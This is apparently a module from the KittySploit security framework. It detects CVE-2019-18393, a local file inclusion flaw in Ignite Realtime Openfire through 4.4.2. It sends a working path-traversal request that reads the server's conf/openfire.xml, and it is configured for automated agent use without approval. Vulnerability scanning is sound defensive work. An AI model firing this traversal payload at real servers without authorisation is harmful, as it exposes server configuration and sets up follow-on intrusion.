#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Ignite Realtime Openfire through 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ignite Realtime Openfire <4.42 - Local File Inclusion Detection',
        'description': 'Ignite Realtime Openfire through 4.4.2 is vulnerable to local file inclusion via PluginServlet.java. It does not ensure that retrieved files are located under the Openfire home directory.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'openfire', 'lfi', 'igniterealtime', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/igniterealtime/Openfire/pull/1498',
            'https://swarm.ptsecurity.com/openfire-admin-console/',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-18393',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/Elsfa7-110/kenzer-templates',
        ],
        'cve': 'CVE-2019-18393',
    }

    def run(self):
        r = self.http_request(method="GET", path='/plugins/search/..\\..\\..\\conf\\openfire.xml', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('org.jivesoftware.database.EmbeddedConnectionProvider', 'Most properties are stored in the Openfire database',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='medium',
                reason="Ignite Realtime Openfire <4.42 - Local File Inclusion detected",
                path='/plugins/search/..\\..\\..\\conf\\openfire.xml',
            )
            return True
        return False

